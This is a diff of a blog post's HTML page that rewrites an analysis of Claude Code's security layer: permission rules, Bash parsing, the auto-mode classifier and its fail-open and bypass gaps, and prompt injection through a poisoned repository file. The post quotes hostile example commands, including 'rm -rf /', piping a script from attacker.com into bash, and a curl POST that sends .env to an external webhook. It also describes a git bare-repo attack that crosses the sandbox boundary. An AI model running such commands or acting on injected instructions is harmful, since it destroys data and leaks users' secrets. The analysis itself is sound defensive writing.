@@ -4,10 +4,10 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve. - Guanlan Dai</title><meta name="Description" content="A deep teardown of Claude Code&#39;s security architecture reveals a well-crafted defense-in-depth system — and the structural limits of bolting safety onto a shell-first world."><meta property="og:url" content="https://rmmod.com/posts/agent/claude-code-security/">
+        <title>I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve. - Guanlan Dai</title><meta name="Description" content="Claude Code is a strong local security system. It also shows why shell-first safety breaks down once agents start using real identities and causing real side effects."><meta property="og:url" content="https://rmmod.com/posts/agent/claude-code-security/">
   <meta property="og:site_name" content="Guanlan Dai">
-  <meta property="og:title" content="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve.">
-  <meta property="og:description" content="A deep teardown of Claude Code&#39;s security architecture reveals a well-crafted defense-in-depth system — and the structural limits of bolting safety onto a shell-first world.">
+  <meta property="og:title" content="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve.">
+  <meta property="og:description" content="Claude Code is a strong local security system. It also shows why shell-first safety breaks down once agents start using real identities and causing real side effects.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -20,8 +20,8 @@
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://rmmod.com/posts/agent/claude-code-security/cover.png">
-  <meta name="twitter:title" content="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve.">
-  <meta name="twitter:description" content="A deep teardown of Claude Code&#39;s security architecture reveals a well-crafted defense-in-depth system — and the structural limits of bolting safety onto a shell-first world.">
+  <meta name="twitter:title" content="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve.">
+  <meta name="twitter:description" content="Claude Code is a strong local security system. It also shows why shell-first safety breaks down once agents start using real identities and causing real side effects.">
       <meta name="twitter:site" content="@guanlandai">
 <meta name="application-name" content="My cool site">
 <meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
@@ -30,18 +30,18 @@
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "I Read Claude Code's Security Source Code. Here's What It Can't Solve.",
+        "headline": "I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve.",
         "inLanguage": "en-us",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/rmmod.com\/posts\/agent\/claude-code-security\/"
-        },"genre": "posts","keywords": "Agent, Infra, Harness","wordcount":  1437 ,
+        },"genre": "posts","keywords": "Agent, Infra, Harness","wordcount":  1383 ,
         "url": "https:\/\/rmmod.com\/posts\/agent\/claude-code-security\/","datePublished": "2026-04-02T00:00:00+00:00","dateModified": "2026-04-02T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
                 "name": "guanlan"
-            },"description": "A deep teardown of Claude Code's security architecture reveals a well-crafted defense-in-depth system — and the structural limits of bolting safety onto a shell-first world."
+            },"description": "Claude Code is a strong local security system. It also shows why shell-first safety breaks down once agents start using real identities and causing real side effects."
     }
     </script></head>
     <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
@@ -76,10 +76,10 @@
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve.</h1><div class="post-meta">
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve.</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>guanlan</a>
 </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-04-02">2026-04-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1437 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-04-02">2026-04-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1383 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -88,17 +88,17 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#a-well-executed-defense-in-depth-architecture">A Well-Executed Defense-in-Depth Architecture</a></li>
-    <li><a href="#the-security-philosophy-embedded-in-design-trade-offs">The Security Philosophy Embedded in Design Trade-offs</a></li>
-    <li><a href="#the-auto-mode-classifier-useful-but-unfit-as-a-security-boundary">The Auto Mode Classifier: Useful, but Unfit as a Security Boundary</a></li>
+    <li><a href="#a-strong-defense-in-depth-design">A Strong Defense-in-Depth Design</a></li>
+    <li><a href="#the-ideas-behind-the-design">The Ideas Behind the Design</a></li>
+    <li><a href="#why-the-auto-mode-classifier-cannot-be-the-boundary">Why the Auto Mode Classifier Cannot Be the Boundary</a></li>
     <li><a href="#what-claude-code-leaves-unsolved">What Claude Code Leaves Unsolved</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>Imagine this scenario: a perfectly ordinary <code>curl</code> command is running in your terminal, about to dispatch a batch of runtime logs to an external monitoring system via webhook. To every rule-based security classifier, this is a textbook-compliant, utterly routine operation. But what if the command was triggered by a hidden file in the codebase, one laced with a malicious prompt?</p>
-<p>Over the past few days, I spent considerable time dismantling the security layer source code of Claude Code, line by line.</p>
-<p>Within the confines of a development environment, it offers what amounts to a canonical engineering specimen for combating systemic entropy. Yet the moment this specimen ventures beyond the local terminal and attempts to interface with real-world commercial workflows, a profound blind spot reveals itself.</p>
-<h2 id="a-well-executed-defense-in-depth-architecture">A Well-Executed Defense-in-Depth Architecture</h2>
-<p>Claude Code&rsquo;s security model is textbook defense-in-depth with four distinct layers, each addressing a different category of risk.</p>
+            </div><div class="content" id="content"><p>Imagine this: a normal curl command is running in your terminal, sending runtime logs to a monitoring webhook. To a rule-based classifier, this looks routine. But what if the command was triggered by a hidden file in the codebase, one laced with a malicious prompt?</p>
+<p>Over the past few days, I read through the source code of Claude Code’s security layer.</p>
+<p>Inside a local development environment, Claude Code is a very strong piece of security engineering. But the moment an agent starts touching real identities and real side effects, the problem changes.</p>
+<h2 id="a-strong-defense-in-depth-design">A Strong Defense-in-Depth Design</h2>
+<p>Claude Code uses a classic defense-in-depth design with four layers, each handling a different kind of risk.</p>
 <p><figure><a class="lightgallery" href="/posts/agent/claude-code-security/claude-code-secuirty-overview.png" title="claude-code-secuirty-overview" data-thumbnail="/posts/agent/claude-code-security/claude-code-secuirty-overview.png" data-sub-html="<h2>Security Architecture Overview</h2><p>claude-code-secuirty-overview</p>">
         <img
             class="lazyload"
@@ -111,19 +111,19 @@
     </figure></p>
 <ul>
 <li>
-<p><strong>Application Layer</strong> <code>permissions.ts</code> serves as the unified permission gateway.</p>
+<p><strong>Application Layer</strong> <code>permissions.ts</code> serves as the main permission entry point.</p>
 <ul>
-<li>Its first order of business is consulting explicit rules from user and project configuration. For instance, <code>Bash(rm:*)</code> marked as deny, <code>Bash(npm run:*)</code> marked as ask. Commands matching deny are rejected outright; those matching ask require user confirmation. Neither needs to proceed further down the pipeline.</li>
-<li>It then invokes tool-level <code>checkPermissions</code>, bespoke checks tailored to each tool&rsquo;s unique attack surface. The Bash implementation is by far the most substantial, and warrants its own discussion below.</li>
+<li>It first checks the explicit rules from user and project config.  For instance, <code>Bash(rm:*)</code> marked as deny, <code>Bash(npm run:*)</code> marked as ask. Commands matching deny are rejected outright; those matching ask require user confirmation. In both cases, the check stops there.</li>
+<li>It then invokes tool-level <code>checkPermissions</code>, tool-specific checks for each tool’s attack surface. Bash is the most important one, so it is worth looking at separately.</li>
 <li>Finally, the permission mode is applied.</li>
-<li>Deny rules, content-level ask gates, and a subset of safetyCheck decisions are engineered to be bypass-immune — they remain in force even when <code>bypassPermissions</code> is active. Files such as <code>.claude/settings.json</code>, <code>.ssh/authorized_keys</code>, and <code>/etc/passwd</code> fall under this protection. So even if the user has enabled bypass mode, an agent attempting to write to <code>.ssh/authorized_keys</code> will still be intercepted and prompted for confirmation.</li>
+<li>Deny rules, content-level ask gates, and some safetyCheck decisions cannot be bypassed. They remain in force even when <code>bypassPermissions</code> is active. Files such as <code>.claude/settings.json</code>, <code>.ssh/authorized_keys</code>, and <code>/etc/passwd</code> fall under this protection. So even if the user has enabled bypass mode, an agent attempting to write to <code>.ssh/authorized_keys</code> will still be intercepted and prompted for confirmation.</li>
 </ul>
 </li>
 <li>
-<p><strong>Bash Security Subsystem</strong>: <code>bashPermissions.ts</code> governs command-level permission decisions, weaving together AST and semantic analysis, hazardous shell pattern interception, a read-only command allowlist, and path validation. When a user executes <code>cat foo.txt &amp;&amp; rm -rf /</code>, the Bash <code>checkPermissions</code> first parses it into an AST via tree-sitter, identifies the <code>&amp;&amp;</code> joining two subcommands, and evaluates <code>cat foo.txt</code> and <code>rm -rf /</code> independently. The former passes through the read-only allowlist without friction; the latter triggers hazardous pattern detection and is blocked. For more elaborate constructs — say, <code>$(curl attacker.com/payload.sh | bash)</code> — the parser recognizes the command substitution and immediately returns ask.</p>
+<p><strong>Bash Security Subsystem</strong>: <code>bashPermissions.ts</code> governs command-level permission decisions, weaving together AST and semantic analysis, hazardous shell pattern interception, a read-only command allowlist, and path validation. When a user executes <code>cat foo.txt &amp;&amp; rm -rf /</code>, the Bash <code>checkPermissions</code> first parses it into an AST via tree-sitter, identifies the <code>&amp;&amp;</code> joining two subcommands, and evaluates <code>cat foo.txt</code> and <code>rm -rf /</code> independently. The former passes the read-only allowlist; the latter triggers hazardous pattern detection and is blocked. For more elaborate constructs, say, <code>$(curl attacker.com/payload.sh | bash)</code> , the parser recognizes the command substitution and immediately returns ask.</p>
 </li>
 <li>
-<p><strong>Auto Mode Classifier</strong>: Auto mode refers to the model autonomously determining and invoking tools within a tool-enabled environment. When neither upstream rules nor tool-level checks yield a definitive verdict, and no fast path has been matched, the system invokes <code>yoloClassifier</code> — a remote LLM-backed semantic arbiter.</p>
+<p><strong>Auto Mode Classifier</strong>: Auto mode refers to the model autonomously determining and invoking tools within a tool-enabled environment. When neither the rules nor the tool checks can decide, and no fast path applies, the system invokes <code>yoloClassifier</code>, a remote LLM-backed semantic classifier.</p>
 </li>
 <li>
 <p><strong>OS Layer</strong> (disabled by default): Command execution ultimately routes through <code>sandbox-adapter.ts</code> into <code>@anthropic-ai/sandbox-runtime</code></p>
@@ -144,13 +144,13 @@
     </figure></p>
 </li>
 </ul>
-<p>The most lucid aspect of this design is that it relegates probabilistic judgment to the very last resort.</p>
-<h2 id="the-security-philosophy-embedded-in-design-trade-offs">The Security Philosophy Embedded in Design Trade-offs</h2>
-<p><strong>The Bash parser&rsquo;s fail-closed principle.</strong> Bash is a Turing-complete language; any security check predicated on regular expressions or keyword matching is inherently untrustworthy. Claude Code&rsquo;s approach: if a reliable argv can be extracted, perform precise matching; if it cannot, unconditionally classify the input as too-complex and fall back to user confirmation. You will never exhaustively enumerate every variant of shell input, but you can choose to refuse autonomous execution in the face of uncertainty. This design principle matters more than any individual rule.</p>
-<p><strong>Hazardous permission sanitization in auto mode.</strong> When the user switches into auto mode, the system automatically purges a class of permissive rules that approach arbitrary code execution: <code>Bash(*)</code>, <code>Bash(python:*)</code>, <code>Bash(node:*)</code>. Even if the user has explicitly configured these permissions, they are temporarily stripped and only reinstated upon exiting auto mode. The rationale is clear: if such rules persist, they would bypass the LLM classifier entirely, rendering auto mode&rsquo;s safety net inert. This reveals a team acutely aware that the combinatorial space between user-configured permission rules and runtime modes harbors explosive risk, demanding proactive tightening at mode boundaries.</p>
-<p><strong>Sandbox defenses against git bare repo implantation.</strong> A bare repository lacks a working tree — its root directory is effectively the contents of <code>.git/</code> itself. <code>sandbox-adapter.ts</code> specifically addresses this attack vector: an adversary plants Git-recognizable files in the current directory within the sandbox, polluting the working directory; later, when Claude runs <code>git</code> outside the sandbox, Git&rsquo;s own behavior is weaponized to carry code execution across the sandbox boundary. The fact that this temporal, cross-boundary attack receives dedicated mitigation demonstrates that the security team has conducted thorough enumeration of real-world attack paths within agent workflows.</p>
-<p><strong>Enterprise-grade managed policy.</strong> The <code>policySettings</code> configuration can be distributed via macOS plist or Windows registry, bypassing local user configuration entirely — disabling bypass, disabling auto mode, restricting usage to managed rules and approved domains. Much like MDM-enforced policies, these rules are immutable and carry the highest priority, forming a hard constraint on agent behavior that administrators alone can define.</p>
-<h2 id="the-auto-mode-classifier-useful-but-unfit-as-a-security-boundary">The Auto Mode Classifier: Useful, but Unfit as a Security Boundary</h2>
+<p>The best part of this design is the ordering: deterministic checks come first, and the model only shows up at the end.</p>
+<h2 id="the-ideas-behind-the-design">The Ideas Behind the Design</h2>
+<p><strong>The Bash parser&rsquo;s fail-closed principle.</strong> Bash is a Turing-complete language; any security check based on regexes or keyword matching is easy to break. Claude Code&rsquo;s approach: if a reliable argv can be extracted, match it precisely; if it cannot, unconditionally classify the input as too-complex and fall back to user confirmation. You will never cover every shell variant, but you can choose to stop automatic execution when the system is not sure. This design principle matters more than any individual rule.</p>
+<p><strong>Auto mode strips dangerous permissions.</strong> When the user switches into auto mode, the system automatically purges a class of permissive rules that approach arbitrary code execution: <code>Bash(*)</code>, <code>Bash(python:*)</code>, <code>Bash(node:*)</code>. Even if the user has explicitly configured these permissions, the system removes them in auto mode and restores them when auto mode ends. The rationale is clear: if such rules persist, they would bypass the LLM classifier entirely, which would make auto mode’s safety layer meaningless. This shows the team understands that different combinations of rules and modes can create real risk, demanding proactive tightening at mode boundaries.</p>
+<p><strong>Sandbox defenses against git bare repo implantation.</strong> A bare repository lacks a working tree, its root directory is effectively the contents of <code>.git/</code> itself. <code>sandbox-adapter.ts</code> specifically addresses this attack vector: an adversary plants Git-recognizable files in the current directory within the sandbox, polluting the working directory; later, when Claude runs <code>git</code> outside the sandbox, Git&rsquo;s own behavior is weaponized to carry code execution across the sandbox boundary. The fact that this cross-boundary attack gets its own mitigation tells you the team has thought through real attack paths in agent workflows.</p>
+<p><strong>Enterprise-grade managed policy.</strong> The <code>policySettings</code> configuration can be distributed via macOS plist or Windows registry, bypassing local user configuration entirely, disabling bypass, disabling auto mode, restricting usage to managed rules and approved domains. Much like MDM-enforced policies, these policies are immutable, take priority over local settings, and set hard limits on what the agent can do.</p>
+<h2 id="why-the-auto-mode-classifier-cannot-be-the-boundary">Why the Auto Mode Classifier Cannot Be the Boundary</h2>
 <p><figure><a class="lightgallery" href="/posts/agent/claude-code-security/auto-mode-trade-off.png" title="auto-mode-trade-off" data-thumbnail="/posts/agent/claude-code-security/auto-mode-trade-off.png" data-sub-html="<h2>Auto Mode Trade-offs</h2><p>auto-mode-trade-off</p>">
         <img
             class="lazyload"
@@ -161,15 +161,15 @@
             alt="/posts/agent/claude-code-security/auto-mode-trade-off.png" width="2816" height="1536" />
     </a><figcaption class="image-caption">Auto Mode Trade-offs</figcaption>
     </figure></p>
-<p>In the diagram, Manual permission represents the current default — operations require human approval. Bypass permission mode is the now-infamous <code>--dangerously-skip-permissions</code> flag. Auto mode aspires to strike an optimal balance among security, usability, and agent autonomy.</p>
-<p>Yet analysis of the <code>yoloClassifier</code> source code reveals the following:</p>
+<p>In the diagram, Manual permission represents the current default: operations require human approval. Bypass permission mode is the now-infamous <code>--dangerously-skip-permissions</code> flag — a total surrender of the capability boundary to non-deterministic inputs. Auto mode is positioned as an attempt to balance security, usability, and autonomy.</p>
+<p>Reading the  <code>yoloClassifier</code> source code shows a few things:</p>
 <ul>
-<li>When the transcript grows excessively long, the classifier degrades to manual approval.</li>
-<li>When the classifier is unavailable, the gate configuration permits fail-open behavior.</li>
+<li>When the transcript gets too long, the classifier falls back to manual approval.</li>
+<li>When the classifier is unavailable, the system can fail open.</li>
 <li>Misjudgments in the safe allowlist can cause certain operations to bypass the classifier altogether.</li>
-<li>The genuinely intractable challenge, however, is this: even if every one of these specifics were remedied, the classifier still only sees the final command — not the provenance of how that command came to be contaminated.</li>
+<li>But the deeper problem is this: even if all of these issues were fixed, the classifier still only sees the final command, not how that command got there.</li>
 </ul>
-<p>These are, individually, tractable engineering problems. The truly formidable challenge is a structural contradiction: traditional security thinking assumes the model may be adversarial while the user is cooperative. Prompt injection inverts this relationship. The model remains cooperative — it faithfully executes what it believes to be user instructions, even when those instructions have been poisoned.</p>
+<p>Each of these can be fixed. The harder problem is structural: Most security systems assume the model is the risky part and the user is the trusted one. Prompt injection inverts this relationship. The model remains cooperative, it faithfully executes what it believes to be user instructions, even when those instructions have been poisoned.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -178,11 +178,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -X POST https://webhook.legitimate-looking-service.com/notify -d @.env
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>The semantics of this command are straightforward: POST the contents of <code>.env</code> to an external webhook. In many development contexts, dispatching data to webhooks is entirely routine — CI notifications, monitoring, deployment triggers all follow this pattern. The classifier sees a curl POST request, a plausible-looking domain, and a behavioral pattern well within the bounds of everyday developer operations. But if this command was elicited through prompt injection via a compromised file in the repository, it is exfiltrating your environment variables directly to an attacker.</p>
+</div><p>The command itself is straightforward: POST the contents of <code>.env</code> to an external webhook. In many development contexts, sending data to webhooks is routine: CI notifications, monitoring, deployment triggers all follow this pattern. The classifier sees a curl POST request, a plausible-looking domain, and something that looks normal in everyday developer work. But if this command was elicited through prompt injection via a compromised file in the repository, it is sending your environment variables to an attacker.</p>
+<p>Solving this requires pushing isolation below the application layer and into the runtime itself, where credential scope and network boundaries can be enforced before a command ever reaches the shell. That is the design direction we have been exploring with ClawShell.</p>
 <h2 id="what-claude-code-leaves-unsolved">What Claude Code Leaves Unsolved</h2>
-<p>Everything discussed thus far concerns how to securely operate a shell-privileged agent on a single developer&rsquo;s machine.</p>
-<p>But long-horizon agent workflows are rapidly outgrowing this perimeter. The moment an agent begins sending emails, mutating databases, or triggering payments, the question is no longer whether a particular command is dangerous. It becomes whether the side effect has been committed, whether it can be unwound, and who assumes control when things go wrong. At this point, the system should be governing not commands but effects: who granted the capability, who initiated the invocation, which external actions have already materialized, and which remain pending. And confronted with such operations, the system should no longer be limited to two options — permit or kill. It needs a third capability: suspension. Halting the operation at the boundary, preserving both state and context, and waiting until policy approval, human confirmation, or automated recovery logic is ready — only then deciding whether to proceed, roll back, or hand over to a human operator.</p>
-<p>All of this, however, rests on a prerequisite: before the agent begins execution, the system must have already determined three things — under whose identity the agent is acting, which external systems it is authorized to touch, and which actions, once taken, must be suspended pending human intervention. This is not something a runtime security layer can retrofit. It is the foundational design premise of the execution environment itself. Claude Code makes remarkably sound engineering decisions within its given constraints, but its architecture simultaneously illustrates a deeper truth: layering security atop a shell-first execution environment introduces a complexity that itself becomes a new source of risk. For those designing an agent execution layer from the ground up, this is the strongest possible argument for rethinking the underlying abstractions.</p>
+<p>Everything so far is about how to run a shell-privileged agent safely on one developer’s machine.</p>
+<p>But long-horizon agent workflows are already moving past that boundary. The moment an agent starts sending emails, updating databases, or triggering payments, the question is no longer whether one command looks dangerous. The question is whether the effect has already happened, whether it can be undone, and who takes over when something goes wrong.</p>
+<p>At that point, the system has to track effects, not just commands: who granted the capability, who initiated the action, which effects have already happened, and which are still pending.</p>
+<p>And confronted with such operations, the system should no longer be limited to two options: permit or kill. It needs a third capability: suspension. It should be able to stop the operation at the boundary, keep the state and context, and wait for policy approval, human review, or automated recovery. Only then deciding whether to proceed, roll back, or hand over to a human operator.</p>
+<p>But none of this can be bolted on at the end. Before the agent runs, the system has to decide three things: whose identity the agent is using, which external systems it may touch, and which actions must stop for human approval before they commit.</p>
+<p>That is not something a shell policy can retrofit later. It has to be part of the execution model from the start. Claude Code makes remarkably sound engineering decisions within its constraints. But it also makes something else clear: once agents start acting with real identities and real side effects, adding more safety checks around a shell is no longer enough.</p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
@@ -192,7 +196,7 @@
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve." data-via="guanlandai" data-hashtags="Agent,Infra,Harness"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-hashtag="Agent"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve."><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve."><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve."><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve." data-via="guanlandai" data-hashtags="Agent,Infra,Harness"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-hashtag="Agent"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve."><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve."><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://rmmod.com/posts/agent/claude-code-security/" data-title="I Read Claude Code’s Security Layer. Here’s What It Still Can’t Solve."><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
